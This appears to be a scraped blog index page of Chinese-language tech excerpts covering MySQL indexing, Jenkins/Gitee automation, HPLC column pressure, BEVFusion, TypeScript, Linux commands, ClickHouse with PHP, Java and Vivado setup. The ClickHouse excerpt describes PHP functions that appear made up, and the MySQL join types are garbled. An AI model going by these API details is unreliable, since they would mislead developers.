使用聚合索引，应把标识读最高的字段放在最左边，因为字段的匹配从左到右；
索引在使用的时候要注意where后字段的类型是否与索引的字段的类型一致，不一致会失效，例如索引的字段类型是varchar，但是where后的字段不用单引号包起来，这样索引会失效；
不在where后直接参与运算；
一条SQL的join不应该超过五条，否则可能会影响查询速度；
SQL的优化可以用解释计划去分析，主要看以下两列：
type 这是重要的列，显示连接使用了何种类型。从最好到最差的连接类型为const（最好）、eq_reg、ref（标准）、range（最低要求）、indexhe和ALL
Extra 关于MYSQL如何解析查询的额外信息。这里如果出现Using filesort和Using temporary，就要优化了。前者是数据库需要进行额外的操作发现如何对返回的行排序，后者是MYSQL需要创建一个临时表来存储结果，这通常发生在对不同的列集进行ORDER BY上，而不是GROUP BY上
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/82dc6ae89e30b2a789feb791bee08ff6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02bf7cb11dc2ff2956ec8c6aba63307c/" rel="bookmark">
			Linux服务器上的Jenkins，自动拉取Gitee代码、编译、打包、运行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		废话不多说，直接上干货 要实现由Gitee触发Jenkins自动拉取代码，Jenkins必须是部署在公网上的！公网！公网!公网！重要的事情说三遍！ 1.需要安装的插件：Git、Generic Webhook Trigger Plugin （在此之前，还需要在Jenkins中配置jdk、maven、git等，本文因为主要讲怎么自动拉取代码，所以不在此处赘述了，不会的小伙伴可以评论区发言，安排下篇文章出~~~~~~~~~~~）
2.创建一个项目→【配置】→【源码管理】 *****如何获取仓库地址：登录Gitee，找到仓库
*****如何添加凭据：
2. 【构建触发器】 *****如何添加token：【系统管理】→【管理用户】
可以多添加几个token，以后分别用于不同的项目。（不然多个项目都用一个token的话，其中一个项目的更新就会触发其他的项目也进行拉取、打包、运行......）
3.【构建】 此处的命令，以自己的实际项目为准，以自己的实际项目为准以，自己实际项目为准。
下面的是针对前端的打包、运行
4.登录Gitee→进入仓库→新建webhook→ 在URL中输入刚才在Jenkins中复制的那个地址，修改两个地方，修改完一定要检查格式
点击测试，看是否能够触发Jenkins自动拉取代码
在Jenkins中看到下图的样子，有一个任务正在构建，说明就测试成功了。
至此，Jenkins自动拉取Gitee代码、打包、运行就完成了。
欢迎点赞、评论、收藏和关注，持续更新中~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b1dafac192b7a58f0f470dacd420bd4/" rel="bookmark">
			液相色谱柱柱压升高原因及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为液相色谱系统的核心耗材，液相色谱的色谱柱可以说是整个液相色谱系统的核心了。它不仅决定了液相色谱系统是否能够正常运转，也极大的影响了液相色谱体统的实验结果。当然，作为一种耗材，液相色谱柱最终还是会损坏并报废的，液相色谱柱的损坏70-80%都是由于柱压升高导致的，色谱柱使用了一段时间以后，压力会有所升高，达到一定程度以后色谱柱就会报废。但是如果在一天之内压力升高了2-5个mpa，或者在几次使用后压力就翻倍的升高，这些都是异常状况，那建议进行排除。那么液相色谱柱柱压升高的原因有哪些？
色谱柱保存不当
色谱柱保存不当是较为常见的液相色谱柱柱压升高的原因，主要有一下两个方面：（1）色谱柱如较长时间不用，重新启用后需按说明书的活化方法重新活化后再使用，否则也会出现柱压升高，柱效下降。
解决办法：按说明书重新活化色谱柱。（2）除另有规定外，一般反相色谱柱都需保存在高比例有机相中，以防止微生物滋生。否则，重新启用时，会因微生物滋生而导致柱压异常升高。
解决办法：这种情况，可以尝试用乙腈-水-TFA=50-50-0.1低流速过夜冲洗色谱柱。
样品污染样品污染也是较为常见的液相色谱柱柱压升高的原因。因为待检测样品成分复杂，部分成分死吸附在柱头端，导致柱压升高，柱效下降。
办法1：中药项目往往样品会比较脏，使用一定时间后，会因柱头污染导致色谱柱性能下降，这种情况下，可将色谱柱反接并按说明书的异常冲洗方法进行冲洗。
办法2：加保护柱，保护柱为一种牺牲式拦截污染，有一定的使用寿命。做的过程中关注柱压，如柱压升高10%，则需更换保护柱芯。有些柱温箱无法放入保护柱，则可偿试将保护柱接在柱前，进样品后，但这种情况需对比不加保护柱的分析图谱，确定没有因保护柱与检测色谱柱的柱温差异而产生色谱图差异的情况下，才可以使用。
办法3：检测样品建议采用小孔径的滤头或滤膜(如0.22μm)进行过滤后再进样，以尽量减少污染物进入色谱柱。
办法4：定期维护色谱柱(确认为样品污染导致柱效下降，而不是填料塌陷的)：对于确认是样品污染导致色谱柱使用一段时间柱效下降的，建议对该项目使用的色谱柱反接后按说明书的异常再生方法进行定期维护；这种处理的好处是，能减少柱子污染物聚集，延长色谱柱使用寿命。
其他相关知识点：柱压反映了色谱柱的内部状况，所以是&amp;nbsp;HPLC方法中的最重要参数之一，当柱压升高接近上限或者柱压有异常升高，往往意味着色谱柱出状况了，需及时进行维护和补救，严重时色谱柱就已报废了。
下面是色谱柱柱压方程。
对填充色谱柱，柱压与黏度 (η)、柱长 (L)和流速 (F)成正比，与填料粒径（d p）以及柱管半径（r）的平方成反比。K0是比渗透性系数，对填充床，其值约为0.001。通过此公式可近似计算出给定色谱条件下的理论柱压。只有当新柱实际测得的柱压和理论柱压相差很大，才能说柱压存在问题。
黏度 (η)取决于流动相溶剂的选择，为降低柱压，反相色谱中倾向于选择低黏度的乙腈，而不是高黏度的异丙醇。当然选择时还需考虑溶剂强度、极性、分析物的溶解度以及和分析物兼容性等。柱长（L）增加可以提高分离度（R），流速（F）提高能加快分离，但都会导致柱压上升，选择确定这些运行参数时，需综合平衡和折中。
填料粒径对柱压影响极大，d p降低一倍，柱压将增加4倍。UHPLC中采用的sub-2 μm填料，柱压超过普通HPLC泵的400Bar上限很多。提高柱温因可降低黏度η，相应降低柱压。在梯度洗脱时，黏度随流动相组成的变化而改变，柱压也会处在不断变化中。对水/甲醇流动相体系，在55：45时，黏度和柱压有个极大值。
内径的影响同样很大，根据线流速相同柱压相同的原则，4.6mm内径的色谱柱流速为1mL/min，约相当于在2.1mm内径色谱柱上的0.2mL/min流速，在10mm半制备色谱柱上的5mL/min，计算公式为v＝1.0mL/min x（内径r/4.6）2。所以在换不同内径色谱柱时，请及时调整流速，以免因高柱压损伤色谱系统。
柱压下降是仪器系统的连接有泄漏，柱压不稳定一般认为是流路中有气泡或空穴，和色谱柱相关的柱压问题是柱压上升。
柱压波动的原因及解决办法
和柱压波动相关最大的是进口端筛板（inlet frit）以及其后面1-2cm长度的柱头填料。筛板上有比填料粒径小的小孔，筛板上的小孔或柱头填料的间隙被部分堵塞，是柱压上升的主要原因。有以下几类情况：
1、填料破碎和使用后有填料粉末生成
填料破碎一般在装柱过程中发生，装柱压力过大或所选硅胶机械强度过低所至，设定柱压出厂标准可解决；流动相中高pH值缓冲盐使硅胶溶解并重新形成填料粉末，堵塞出口端筛板，这种情况下反冲不起作用，只有更换后筛板，不过打开承压的后筛板，对柱床会有不好影响。
2、颗粒物堵塞引起柱压上升和对策
可能堵塞进口端筛板（前筛板）和柱头填料间隙的颗粒物来源有：样品（制样时灰尘和滤纸等带入）、进样阀密封圈磨损、流动相（溶剂本身含有和配制过程进入）、液相仪器中泵阀密封圈的磨损、缓冲盐析出（一般在梯度运行和进样时盐的溶剂环境改变导致）。
水和缓冲盐流动相内生长的细菌，也是颗粒物来源的一种，可堵塞筛板和填料间隙。应避免将这类流动相在室温下久放，可放入冰箱存放。
（1）预防措施
样品（甚至标准品）和流动相过滤，既预防了筛板、柱头和毛细管堵塞，又能减少进样阀、活塞杆和截止阀等仪器关键部件的磨损。普通用0.45μm孔径滤膜过滤样品和流动相，对使用2μm以下填料的超高压柱的，可用0.20μm滤膜。滤膜材质有再生纤维素、聚四氟乙烯、尼龙、硝酸纤维和醋酸纤维等，须根据和样品溶剂及分析物的适应性慎重选择。
使用保护柱或在线过滤器，具体安装位置见下图：
在线过滤器内装有可更换的滤片，滤片孔径一般有2μm和0.5μm两种。安装位置有两个可选择，在进样器和色谱柱之间时，对样品和流动相中的颗粒物都有效；在泵和进样器之间，则只对流动相有过滤作用。
保护柱是缩小版的色谱柱，内含带填料的可更换的柱芯，安装在进样阀和色谱柱之间，用于防止色谱柱的化学污染为主，也有过滤颗粒物的作用。
（2）故障排除
反冲色谱柱：不连接检测器，直接将堵在前筛板上的颗粒物冲出排到废液瓶中。开始时反冲压力可低于正常使用压力，待颗粒物有冲出后，逐步提高冲洗压力。有时颗粒物已非常牢固嵌入到筛板内部，反冲不一定凑效，早反冲、勤反冲相对效果更好。有的厂商为避免堵塞，使用了较大孔径（2-5μm）的前筛板，这种情况反冲会将填料冲出。
换筛板：一般不建议这样做，因为换筛板会带走粘在筛板上的部分填料，使柱床的均一性受影响，导致柱效下降。不过如果反冲不能解决问题，也只能不得已而为之，要不然就要把色谱柱报废了。
如果系统中不接色谱柱，柱压仍然高，说明泵出口到色谱柱之间的其它部位，包括进样器、在线过滤器和保护柱等有堵塞，可逐一排查。为了减少死体积，毛细管都做得尽可能的细，也可能被堵。
3、化学污染物引起柱压上升和对策
来源同样是样品、流动相和系统，不过来源于样品的污染最普遍，特别是对复杂基体样品未经前处理或前处理不够的时候。化学污染物主要有：分子量很大的化合物、盐类、脂质、蜡类、油脂、腐殖酸、蛋白质等其它生物来源的物质。
像盐类这样的保留能力极小的污染物会在死体积处很快从柱中洗脱出去，检测器一般对此类物质响应不大，有时表现为干扰峰、基线波动、斑点甚至负峰。
保留能力中等的污染物，会被慢慢洗出色谱柱，表现为宽峰、基线馒头形波动和基线缓慢漂移。
对强保留的污染物，一般流动相强度不足以将其从柱中洗出，会逐步在柱头累积。有时，累积在柱头的污染物可作为新固定相对分析物起作用，引起保留时间改变、峰拖尾和峰分叉等。污染物在柱头累积到一定程度，如果不采取措施，会堵塞填料间隙，引起柱压上升。最好的办法是选用合适的溶剂冲洗溶解这些物质，同时又不对填料本身有损害。如聚合物柱中累积的蛋白类污染物可用pH13-14的强碱溶液洗掉，但这种方法不适合硅胶基质色谱柱。
（1）预防措施：
a．制样时采用SPE固相萃取等方法，预先将色谱柱杀手类的污染物质清除掉；
b．连接保护柱。保护柱是分析柱的延伸，在填料类型和粒径上应与分析柱一致，才能最大限度起保护作用，又不影响色谱性能。一个设计和装填良好的保护柱，还可增加分析柱的分离效率。如果因某种原因需在保护柱中用不同的填料，也应选择比其所保护的分析柱保留能力弱的固定相，这时的保护柱完全用于截住强保留物质，类似于SPE小柱的功效。当保护柱柱芯保护功能用尽时，也不能说不可再清洗后复用，但价格低不值得去花这个时间。
c．经常对分析柱进行冲洗维护。
（2）故障排除：
已经累积很多污染物，用甲醇或乙腈简单冲洗不奏效，推荐使用下面方法清洗反相柱100％甲醇---100％乙晴---75％乙晴/25％异丙醇---100％异丙醇---100％二氯甲烷---100％正己烷用每种溶剂冲洗至少10个柱体积，对于250mm×4.6mm的分析柱，合适的冲洗流速是1～2mL/min。最后用10柱体积的异丙醇过渡，然后回到原来的流动相体系。
对受蛋白类污染的硅胶基质反相柱，纯有机溶剂如乙腈或甲醇不能溶解多肽和蛋白质。由有机溶剂、缓冲液和酸,有时还加上离子对试剂等组成的配方清洗效果极佳，譬如用三氟乙酸水溶液和三氟乙酸/丙醇溶液对柱子重复进行梯度洗来再生；Bhadwaj和Day试验了在250mm×4.6mm的柱子中注入100μL的三氟乙醇，再生效果良好。
清洗硅胶、CN和Diol等正相柱建议方法：先用20柱体积50：50正己烷/氯仿冲洗，然后用甲醇、二氯甲烷或者100%醋酸乙酯冲洗。对油脂类物质，可用异丙醇清洗。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0cec9089747355cec333220e192dd4fe/" rel="bookmark">
			25FPS！全网首发 | 英伟达开放BEVFusion部署源代码，边缘端实时运行！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：手写ai书写未来，来源：集智书童，编辑：3D视觉工坊
英伟达开源BEVFusion边缘部署高达25FPS！
引言： 众所周知，雷达与相机的融合方案由于稀疏卷积的原因导致一直难以落地推广。而没有使用稀疏卷积的方案精度通常会差10-30%左右，并且目前的融合方案在Orin上的性能非常差（例如BEVFusion在3090Ti上只有8.6FPS）,这严重地制约了自动驾驶的落地表现。英伟达刚刚发布了部署BEVFusion的方案，以惊人的25FPS同时保持67.66的高精度mAP运行在Orin上，这对于雷达相机融合的感知落地来说，这是一项十分令人兴奋的工作！这意味着雷达感知的精度和速度将会得到大幅度的提升，并且轻易的部署！
代码发布在 https://github.com/NVIDIA-AI-IOT/Lidar_AI_Solution
一、仓库介绍 该仓库主要提供了3个模型（BEVFusion、CenterPoint、PointPillars）和5个libraries（sparse conv, quantization solution, cuPCL, cuOSD, YUVToRGB）
这些模块，通过下面的方式组织起来
下面是一个BEVFusion的执行效果
模型的精度和速度如下表（nuScenes验证集的平均速度）
可以看到，模型在PTQ量化后只有0.3%mAP的损失，是相当不错的
在保持高精度的同时还保持了高的推理速度，这对自动驾驶来说非常友好
仓库提供了模块化的实现，对于按照要求修改会比较友好
二、稀疏卷积(Sparse Convolution) 仓库还提供了稀疏卷积的解决方案，他的实现是独立于tensorRT之外的，纯cuda核函数调用TensorCore实现的一个库
它通过onnx文件加载模型并进行推理加速，轻量且高效
提供了FP16和INT8推理的支持。支持子流形和空间稀疏卷积
同时还提供了CenterPoint和BEVFusion的lidar导出以及PTQ/QAT保证速度和精度的解决方案
详细的精度指标如下
下面是在nuScenes上的耗时统计，稳定性非常好
三、BEVfusion介绍 BEVfusion框架图BEVFusion是一种用于自动驾驶系统的先进技术。它代表着鸟瞰融合（Bird's Eye View Fusion），是一个多任务、多传感器融合框架，极大地提高了自动驾驶汽车的性能[2]。
四、落地部署的挑战 1. ONNX导出复杂 BEVFusion是一种涉及到SparseConv（稀疏卷积）层和自定义CUDA操作（如BEV池化）等复杂特性的模型[4]。这些特性对于转换到 ONNX，以及后续在TensorRT上部署都构成了难题。
我们简单地总结了一下难以转ONNX的主要原因：
（1）自定义CUDA操作：BEVFusion使用的自定义CUDA操作在ONNX模型导出中并不被原生支持[5]。这意味着这些操作需要手动在ONNX中注册为自定义操作，这是一项具有挑战性的任务。
（2）SparseConv层：在BEVFusion中使用的SparseConv层并不被ONNX原生支持[6]。这使得转换过程变得复杂，因为需要手动处理这些层。
2.Plugin和BEVpooling效率低下 制约BEVfusion广泛落地的另一个原因就是其Plugin和BEVpooling的效率不够高。BEVFusion中的BEVPool使用CUDA来加速，但它仍然需要计算、存储和预处理视锥特征(frustum feature)，这在内存和计算上都十分密集[7]。
尽管BEVfusion在框架设计上已经进行了优化，相比于以前的研究，以更高的精度和降低1.9倍[8]的计算成本在nuscenes上设立了新的基准。但是，对于自动驾驶这种高速场景来说，我们应该追求更高的性能，以确保安全驾驶。因此，对某些操作的计算强度进行进一步优化是非常有价值的。
3.项目工程相对复杂 比起普通的单传感器感知，BEVfusion工程也相对复杂，主要体现在下面几个方面：
（1）多任务多传感器融合框架：BEVFusion被设计为一个高效且通用的多任务多传感器融合框架。它在共享的鸟瞰视图（BEV）表示空间中统一多模态特征，这既保留了几何信息也保留了语义信息[9]。这种任务和方法的复杂性直接反映在仓库的结构和内容上。
（2）坐标系统的修改和体素化（Coordinate system modification and voxelization）：BEVFusion项目对其实现进行了重大更改，例如从zyx体素化切换到xyz体素化。在一些头部，xy BEV坐标与先前的实现相比进行了转置。这可能会增加仓库的复杂性，尤其是对熟悉先前版本的人来说[10]。
4. 总结 尽管BEVFusion确实提供了一种新颖且有效的方式来处理多传感器融合任务，但是在实际部署过程中仍存在以上的挑战。包括ONNX导出复杂、插件和BEVpooling效率低下以及项目工程相对复杂等问题。这些问题需要我们在实践中寻找解决方案。而这，正是英伟达提供的方案致力于解决的，新的部署方案在保持67.66的高精度mAP的同时，实现了在Orin上以惊人的25FPS运行，这对雷达和相机的融合感知落地来说无疑是一次重大突破。这项工作不仅证明了BEVFusion的实用性，还展示了其潜力，即在高精度和高效率之间找到平衡，以满足自动驾驶等高速场景的需求。
reference [1] "Aug 16, 2022 · Multi-sensor fusion is essential for an accurate and reliable autonomous driving system URL: https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0cec9089747355cec333220e192dd4fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96e8ce7de03e9e7b5d94023e87aa3b44/" rel="bookmark">
			TypeScript中Class Interface Type的定义和区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TypeScript中的Class、Interface和Type是用来定义数据类型的工具。它们的使用情境和作用有些不同。
目录
Class（类）
Interface（接口）
Type（类型）
总结
Class（类） 类可以用于创建对象，它可以定义对象的属性和方法。 类可以单继承父类(每个类只能继承一个父类)，并且可以通过创建实例来使用类定义的属性和方法。 类可以封装和组织数据和逻辑。
下面是一个Class的代码示例：
// 定义类 人 class Person { // 定义"人"这个类包含的属性 name: string; age: number; // 实例化对象时，需传入的属性值 constructor(name: string, age: number) { this.name = name; this.age = age; } // 实例化对象可调用此方法 sayHello() { console.log(`Hello, my name is ${this.name} and I'm ${this.age} years old.`); } } // 实例化一个"人"的对象 const person = new Person("John", 25); // 调用此类中包含的方法 person.sayHello(); Interface（接口） 接口是用于定义对象的结构和行为的规范。 接口定义了对象应具备的属性和方法，但不提供实现。 接口可以用来描述类的公共部分，并且类可以实现一个或多个接口。 接口可以继承其他接口。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96e8ce7de03e9e7b5d94023e87aa3b44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e364d63d5404c851ef76d9e7fa6a9a7/" rel="bookmark">
			Linux 命令行的十大常用技巧与示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言：Linux 是一个强大且广泛应用于服务器和个人计算机的操作系统。作为一名 Linux 用户，掌握命令行是必不可少的技能。本文将介绍 Linux 下最常用的十个命令行技巧，并提供详细的示例，帮助读者更好地使用 Linux。## 1. 文件和目录操作### 1.1 列出目录内容ls 命令用于列出当前目录的内容，通过不同的选项可以显示更多信息。bash# 列出当前目录的内容ls# 列出当前目录的详细内容ls -l# 列出所有文件（包括隐藏文件）的详细内容ls -a### 1.2 切换目录cd 命令用于切换当前工作目录。bash# 进入指定目录cd /path/to/directory# 进入上一级目录cd ..# 进入家目录cd ~### 1.3 创建和删除目录mkdir 和 rmdir 命令用于创建和删除目录。bash# 创建一个名为 "mydir" 的目录mkdir mydir# 递归创建多级目录mkdir -p /path/to/directory/subdirectory# 删除空目录rmdir mydir### 1.4 复制、移动和删除文件cp、mv 和 rm 命令用于复制、移动和删除文件。bash# 复制文件cp file.txt /path/to/destination# 递归复制目录cp -r sourcedir /path/to/destination# 移动文件或重命名文件mv file.txt newname.txtmv file.txt /path/to/destination# 删除文件rm file.txt# 删除目录及其内容rm -r mydir## 2. 查看文件内容### 2.1 使用 cat 命令cat 命令用于查看文件内容，并可以将多个文件合并输出。bash# 查看文件内容cat file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7e364d63d5404c851ef76d9e7fa6a9a7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1f17957b777a90c411c7e654aefbdc8/" rel="bookmark">
			浏览器下载出错问题，etc文件下无hosts文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Microsoft Edge浏览器下载出错，总是出现Extension Can't Connect to NeatDownloadManager Application, YouCan .............报错！！！
Win+R以管理员身份运行cmd，输入：
for /f %P in ('dir %windir%\WinSxS\hosts /b /s') do copy %P %windir%\System32\drivers\etc &amp; echo %P &amp; Notepad %P 稍等30s，是否覆盖hosts文件，Yes，回车。
成功生成hosts。
大功告成！！！
要是还出现错误的话，就按住删除键的同时鼠标点击下载链接，就可以恢复下载了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0dd43aa4a007a20810db193ba2613ee/" rel="bookmark">
			ClickHouse数据库与PHP的无缝集成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ClickHouse数据库是一种基于列的数据库，支持高效数据的存储和查询。而PHP是一种流行的Web编程语言，被广泛应用于Web开发。在实际应用中，我们经常需要将PHP与ClickHouse进行集成，以实现高效的数据处理和查询。本文将探讨如何实现ClickHouse数据库与PHP的无缝集成。
ClickHouse数据库与PHP的无缝集成
安装ClickHouse PHP扩展 要实现ClickHouse数据库与PHP的无缝集成，我们需要先安装ClickHouse PHP扩展。这个扩展提供了一组PHP函数，用于连接到ClickHouse数据库、执行查询和获取结果。安装该扩展非常简单，只需要运行以下命令即可：
sudo pecl install clickhouse 安装完成后，我们就可以在PHP代码中使用ClickHouse相关函数了。
连接到ClickHouse数据库 要连接到ClickHouse数据库，我们需要使用clickhouse_connect()函数。该函数接受三个参数：服务器地址、端口和数据库名称。例如：
$conn = clickhouse_connect('localhost', 8123, 'mydb'); 这将连接到名为“mydb”的数据库。我们还可以指定用户名和密码，以进行身份验证。
执行SQL查询 一旦我们成功连接到ClickHouse数据库，就可以使用clickhouse_query()函数执行SQL查询了。例如，以下代码将从表“mytable”中获取所有记录：
$result = clickhouse_query($conn, 'SELECT * FROM mytable'); 这将返回一个结果集，我们可以使用clickhouse_fetch_assoc()函数逐行获取结果。例如：
while ($row = clickhouse_fetch_assoc($result)) { // 处理每一行数据 } 我们还可以使用clickhouse_fetch_row()函数获取一行结果，或者在查询中使用LIMIT和OFFSET子句来分页获取结果。
插入数据 要将数据插入到ClickHouse数据库中，我们可以使用clickhouse_insert()函数。该函数接受两个参数：表名称和数据数组。例如，以下代码将向表“mytable”插入一条记录：
$data = ['id' =&gt; 1, 'name' =&gt; 'John', 'age' =&gt; 30]; clickhouse_insert($conn, 'mytable', [$data]); 我们还可以向表中插入多条记录，只需在数据数组中添加更多的记录。
总结 通过以上步骤，我们就可以实现ClickHouse数据库与PHP的无缝集成。我们可以连接到数据库、执行SQL查询、获取结果集、插入数据等操作，实现高效的数据处理和查询。如果您正在寻找一个高效的数据库解决方案，那么ClickHouse数据库与PHP的结合是一个不错的选择。希望本文能够帮助您更好地了解如何实现这一结合。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0e22286598b36ecfeca7735f4d51c2d/" rel="bookmark">
			Java 多态数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		public class Test { public static void main(String[] args){//多态数组 Person[] person = new Person[4]; person [0] = new Person("ppp",29); person [1] = new PYX("up",29, 50000);//向上转型 person [2] = new Jns("nn", 21, "student");//向上转型 for(int i = 0; i &lt; person.length; i++){//遍历数组 // System.out.println(person[i].say()); if(person[i] instanceof Jns){//Person[i]的运行类型是否是Jns类 或是它的子类 Jns jj = (Jns)person[i];//向下转型（输出该类的“特有”方法需要向下转型） System.out.println(jj.ss()); }else if(person[i] instanceof PYX){//Person[i]的运行类型是否是PYX类 或是它的子类 System.out.println(((PYX) person[i]).xx()); }else if(person[i] instanceof Person){//Person[i]的运行类型是否是Person类 或是它的子类 System.out.println(person[i].say()); }else System.out.println("类型出错，请检查"); } } } public class Person {//父类 private String name; private int age; public Person(String name, int age){ this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0e22286598b36ecfeca7735f4d51c2d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d9b0955b62587161c4f2b12563a9399/" rel="bookmark">
			【Java面试题汇总】Spring,SpringBoot,SpringMVC,Mybatis,JavaWeb篇（2023版）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		导航： 【黑马Java笔记+踩坑汇总】JavaSE+JavaWeb+SSM+SpringBoot+瑞吉外卖+SpringCloud+黑马旅游+谷粒商城+学成在线+常见面试题
目录
一、Spring
二、SpringBoot 2.1 说说你对Spring Boot的理解,以及它和Spring的区别？
2.2 说说Soring Boot的起步依赖
2.3 说说Spring Boot的启动流程
2.4 说说SpringBoot的自动装配
2.5 说说Spring Boot、SSM常用的注解
三、SpringMVC 3.1 说说你对MVC的理解
3.2 为什么service层要写接口？
3.3 介绍一下Spring MVC的执行流程
3.4 说说RestFull风格
四、Mybatis 4.1 介绍一下MyBatis的缓存机制
4.2 在MyBatis中$和#有什么区别
4.3 resultType和resultMap区别
五、JavaWeb
5.1 cookie和session的区别是什么？
5.2 cookie和session各自适合的场景是什么？
5.3 请介绍session的工作原理
5.4 get请求与post请求有什么区别？
5.5 get请求的参数能放到请求体吗？
5.6 页面报400错误是什么意思？
5.8 Maven生命周期
5.9 socket的过程 一、Spring 【Java常见面试题】Spring篇
二、SpringBoot 2.1 说说你对Spring Boot的理解,以及它和Spring的区别？ 得分点
Spring Boot与Spring 的关系 、Spring Boot的主要功能 、Spring Boot的优点
标准回答
与Spring 的关系：Spring Boot是Spring的脚手架框架。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5d9b0955b62587161c4f2b12563a9399/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34deac77bf9fd2732e53e843fb4dc962/" rel="bookmark">
			超详细-Vivado配置Sublime&#43;Sublime实现Verilog语法实时检查
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前言
二、准备工作
三、Vivado配置Sublime
3.1 Vivado配置Sublime
3.2 环境变量添加
3.3 环境变量验证
3.4 Vivado设置
3.5 配置验证
3.6 解决Vivado配置失败问题
四、Sublime配置
4.1 Sublime安装Package Control
4.2 Sublime安装Verilog插件
4.3 安装语法检查工具Iverilog
4.4 Sublime安装插件sublimelinter和sublimelinter-contrib-iverilog
4.5 Sublimelinter配置Iverilog
4.6 结果验证
一、前言 对于使用过其他IDE或编辑工具如Sublime，Vim等小伙伴，在使用Vivado时会发现自带的编辑器很不友好，如缩进功能不友好，不支持高亮显示，不支持自动补全等常用功能。因次，使用第三方编译的需求是很强，但在网上搜索了相关的博文后，发现很多不全或场景不符，在踩了能踩的坑后，终于将整个流程整明白，配置成功，下面将分享整个配置的过程，希望后面的小伙伴能避坑，配置一步到位。
二、准备工作 软件准备
1、sublime安装包(版本不做要求，可自行网上下载，本人使用的是2022版)
2、Vivado（已安装），使用的是Vivado2019.1
3、操作系统window10
关于Sublime的安装就不做说明了，傻瓜式地一键点击，Vivado也是在已安装的前提，如果没有安装需要Vivado的安装包及安装说明可参见之前的文章https://blog.csdn.net/zyp626/article/details/128357763，里面有相关安装说明，并且Vivado是安装后就已破解，无需其他破解操作。
三、Vivado配置Sublime 3.1 Vivado配置Sublime 主要是指在Vivado中将Sublime配置为默认的编辑器，此部分之前写过文章Vivado配置外部编辑器，CSDN路径: https://blog.csdn.net/zyp626/article/details/128357763。为不用跳转方便查看，也将其主要内容搬运过来。
3.2 环境变量添加 进行配置前，需要电脑上已安装外部编辑器，并且已添加到环境变量中，因为Vivado是通过命令方式进行启用外部编辑器，环境变量设置以window10系统为例，搜索框直接输入环境变量，最上方将出现搜索结果
添加已安装程序的环境变量，进入“高级-》环境变量-》Administrator-》Path”
在Path变量中新增，此处已添加Notepad++和sublime。需注意添加时只要到可执行程序的路径即可，不能加上可执行文件名称如Sublime_text.exe等
3.3 环境变量验证 打开命令窗口，直接输入编辑器名称，按Enter键后如果能直接打开编辑器说明配置成功，否则会报错，编辑器名称通常在编辑器安装路径的bin目录下，以sublime为例，名称为sublime_text，如果只输入sublime，则提示非内部或外部命令
验证结果
3.4 Vivado设置 以Vivado2019.1版本为例，配置路径为“Tools-&gt;Settin-&gt;Tool Settings-&gt;Text Editor”，Current Editor中设置的即为当前使用的编辑器，默认为Vivado Text Editor，表示自带的编辑器。
点击下拉框展示可选择项，显示了一些常用编辑器，选择的前提是电脑已安装该编辑器并且已配置环境变量。
此处选择Sublime为例，点击apply，ok设置完毕，如果要确认是否设置成功可直接再次进入查看，显示为Sublime说明设置成功
3.5 配置验证 设置完毕后验证是否配置成功，进入到Vivado的source目录，双击任意任意一个.v文件，提示如下，打开失败
将报错信息中的命令复制到命令窗口执行，根据报错可知是命令有问题，此处原因是应用名称并非sublimetext，应为sublime_text
将名称修改为sublime_text后执行成功，使用sublime打开了指定文件Divider.v文件。
3.6 解决Vivado配置失败问题 根据2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34deac77bf9fd2732e53e843fb4dc962/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/127c0add6b8b97d27a873404494a1e20/" rel="bookmark">
			小程序中vant-weapp时间选择使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、选择单个时间点： wxml：
&lt;van-cell title="选择预约时间" value="{{ time }}" bind:click="onDisplay" /&gt; &lt;van-calendar show="{{ show }}" bind:close="onClose" bind:confirm="onConfirm" /&gt; json：
"van-cell": "@vant/weapp/cell/index", "van-calendar": "@vant/weapp/calendar/index", js：
